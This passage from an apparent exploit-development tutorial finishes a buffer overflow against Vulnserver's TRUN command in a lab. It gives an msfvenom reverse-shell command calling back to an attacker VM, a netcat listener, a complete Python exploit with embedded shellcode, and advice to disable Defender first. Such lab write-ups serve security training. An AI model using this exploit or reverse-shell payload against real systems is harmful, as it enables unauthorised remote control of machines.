s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

Calc pops successfully:

![Calc popped](/assets/img/vulnserver_trun_50_pop_calc.png)


## Reverse Shell

Before you do this, make sure you still have Defender completely deactivated. Defender usually detects the vanilla msfvenom reverse shells.

Here is the msfvenom command for generating a common reverse shell:

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.79 LPORT=53 -f py -v payload -e x86/shikata_ga_nai -b '\x00\x0A' EXITFUNC=thread
```

Once again we give msfvenom our badchars via the `-b` parameter. Also we use `EXITFUNC=thread`, this allows the server to recover from our command execution instead of crashing every time.

Here `10.0.2.79` is the IP address of your attacker VM and `53` is the listening port of your netcat listener.

On your attacker VM listen for a reverse shell:

```bash
$ sudo nc -vlnp 53
[sudo] password for kali: 
listening on [any] 53 ...
```

Adapt the script:

```python
#!/usr/bin/env python3
# Simple socket buffer overflow
# Step 7 - Full Exploit
import socket
import struct

offset = 2005
size = 4096
target_ip = "10.0.2.74"
target_port = 9999
line_ending = b"\n"         # new line 0x0a
badchars = [ 0x00, 0x0a ]   # found badchars
esp_gadget_address = 0x625011af
esp_gadget = struct.pack("<I", esp_gadget_address)
NOP = b"\x90"

# msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.79 LPORT=53 -f py -v payload -e x86/shikata_ga_nai -b '\x00\x0A' EXITFUNC=thread
payload =  b""
payload += b"\xdb\xcf\xd9\x74\x24\xf4\x5a\xbb\x52\xbf\xb0\x52"
payload += b"\x33\xc9\xb1\x52\x83\xea\xfc\x31\x5a\x13\x03\x08"
payload += b"\xac\x52\xa7\x50\x3a\x10\x48\xa8\xbb\x75\xc0\x4d"
payload += b"\x8a\xb5\xb6\x06\xbd\x05\xbc\x4a\x32\xed\x90\x7e"
payload += b"\xc1\x83\x3c\x71\x62\x29\x1b\xbc\x73\x02\x5f\xdf"
payload += b"\xf7\x59\x8c\x3f\xc9\x91\xc1\x3e\x0e\xcf\x28\x12"
payload += b"\xc7\x9b\x9f\x82\x6c\xd1\x23\x29\x3e\xf7\x23\xce"
payload += b"\xf7\xf6\x02\x41\x83\xa0\x84\x60\x40\xd9\x8c\x7a"
payload += b"\x85\xe4\x47\xf1\x7d\x92\x59\xd3\x4f\x5b\xf5\x1a"
payload += b"\x60\xae\x07\x5b\x47\x51\x72\x95\xbb\xec\x85\x62"
payload += b"\xc1\x2a\x03\x70\x61\xb8\xb3\x5c\x93\x6d\x25\x17"
payload += b"\x9f\xda\x21\x7f\xbc\xdd\xe6\xf4\xb8\x56\x09\xda"
payload += b"\x48\x2c\x2e\xfe\x11\xf6\x4f\xa7\xff\x59\x6f\xb7"
payload += b"\x5f\x05\xd5\xbc\x72\x52\x64\x9f\x1a\x97\x45\x1f"
payload += b"\xdb\xbf\xde\x6c\xe9\x60\x75\xfa\x41\xe8\x53\xfd"
payload += b"\xa6\xc3\x24\x91\x58\xec\x54\xb8\x9e\xb8\x04\xd2"
payload += b"\x37\xc1\xce\x22\xb7\x14\x40\x72\x17\xc7\x21\x22"
payload += b"\xd7\xb7\xc9\x28\xd8\xe8\xea\x53\x32\x81\x81\xae"
payload += b"\xd5\xa4\x55\xb2\x6a\xd1\x57\xb2\x74\x14\xd1\x54"
payload += b"\x1e\x46\xb7\xcf\xb7\xff\x92\x9b\x26\xff\x08\xe6"
payload += b"\x69\x8b\xbe\x17\x27\x7c\xca\x0b\xd0\x8c\x81\x71"
payload += b"\x77\x92\x3f\x1d\x1b\x01\xa4\xdd\x52\x3a\x73\x8a"
payload += b"\x33\x8c\x8a\x5e\xae\xb7\x24\x7c\x33\x21\x0e\xc4"
payload += b"\xe8\x92\x91\xc5\x7d\xae\xb5\xd5\xbb\x2f\xf2\x81"
payload += b"\x13\x66\xac\x7f\xd2\xd0\x1e\x29\x8c\x8f\xc8\xbd"
payload += b"\x49\xfc\xca\xbb\x55\x29\xbd\x23\xe7\x84\xf8\x5c"
payload += b"\xc8\x40\x0d\x25\x34\xf1\xf2\xfc\xfc\x11\x11\xd4"
payload += b"\x08\xba\x8c\xbd\xb0\xa7\x2e\x68\xf6\xd1\xac\x98"
payload += b"\x87\x25\xac\xe9\x82\x62\x6a\x02\xff\xfb\x1f\x24"
payload += b"\xac\xfc\x35"

buf = b""
buf += b"TRUN /."
buf += b"A" * offset
buf += esp_gadget        # JMP ESP
buf += NOP * 32
buf += payload
buf += b"D" * (size - offset - 4 - 32 - len(payload))
buf += line_ending

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect((target_ip, target_port))

# receive banner
banner = s.recv(1024)
print(banner)

# send evil buffer
print(f"Sending evil buffer with {len(buf)} bytes and payload length {size}...")
s.send(buf)

# receive response
a = s.recv(1024)
print(a)

s.close()
print("Done!")
```

Run the exploit and you should receive a shell:

![Reverse shell received](/assets/img/vulnserver_trun_66_exploit.png)
